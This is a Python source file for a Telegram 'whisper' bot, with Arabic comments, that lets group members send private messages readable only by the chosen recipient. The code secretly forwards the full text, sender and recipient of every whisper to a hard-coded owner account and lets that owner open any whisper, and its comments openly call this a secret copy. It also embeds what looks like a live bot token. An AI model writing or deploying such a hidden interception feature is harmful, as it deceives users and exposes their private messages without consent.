import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

TOKEN = "8912650382:AAGxGtTJ6loePuTG3Dyt3f8Knhpa4HGDR4A"
bot = telebot.TeleBot(TOKEN)

# 🚨 آي دي حسابك (المالك) لقراءة الهمسات سراً
OWNER_ID = 6312345678 

# قواميس للتخزين
user_states = {}
active_whispers = {}

@bot.message_handler(commands=['start'])
def handle_start(message):
    args = message.text.split()
    
    # 1. حالة ضغط زر "اهمس هنا"
    if len(args) > 1 and args[1].startswith("target_"):
        parts = args[1].split("_")
        target_id = int(parts[1])
        target_name = parts[2]
        user_states[message.from_user.id] = {'target_id': target_id, 'target_name': target_name, 'chat_id': message.chat.id}
        bot.reply_to(message, f"💌 • اكتب همستك لـ **{target_name}** الآن:")
        return

    # 2. حالة قراءة همسة
    if len(args) > 1 and args[1].startswith("whisper_"):
        w_id = args[1].replace("whisper_", "")
        if w_id in active_whispers:
            w = active_whispers[w_id]
            if message.from_user.id not in [w['target_id'], OWNER_ID]:
                bot.reply_to(message, "❌ عذراً، هذه الهمسة ليست لك!")
                return
            bot.reply_to(message, f"💌 نص الهمسة:\n{w['text']}")
            return

    bot.reply_to(message, "✨ أهلاً بك! لعمل همسة، رد على رسالة أي شخص في المجموعة بكلمة (هـ)")

@bot.message_handler(func=lambda message: message.chat.type == 'private')
def private_chat(message):
    uid = message.from_user.id
    if uid in user_states:
        target = user_states[uid]
        w_id = f"w_{uid}_{message.message_id}"
        active_whispers[w_id] = {'text': message.text, 'target_id': target['target_id'], 'sender': message.from_user.first_name}
        
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("🔑 رؤية الهمسة", url=f"https://t.me/{bot.get_me().username}?start=whisper_{w_id}"))
        
        bot.send_message(target['chat_id'], f"• الهمسة لـ [{target['target_name']}](tg://user?id={target['target_id']})\n• من {message.from_user.first_name}", reply_markup=markup, parse_mode="Markdown")
        bot.reply_to(message, "✅ تم إرسال همستك بنجاح.")
        
        # 🕵️‍♂️ نسخة للمالك (سري)
        try: bot.send_message(OWNER_ID, f"🚨 همسة سرية:\nمن: {message.from_user.first_name}\nإلى: {target['target_name']}\nالنص: {message.text}")
        except: pass
        del user_states[uid]

@bot.message_handler(func=lambda message: message.chat.type != 'private')
def group_chat(message):
    if message.reply_to_message and message.text.strip() in ["هـ", "ه", "همس"]:
        target = message.reply_to_message.from_user
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("🛡️ اهمس هنا", url=f"https://t.me/{bot.get_me().username}?start=target_{target.id}_{target.first_name}"))
        bot.reply_to(message, f"• تم تحديد الهمسة لـ {target.first_name}\n• اضغط الزر:", reply_markup=markup)

bot.infinity_polling()
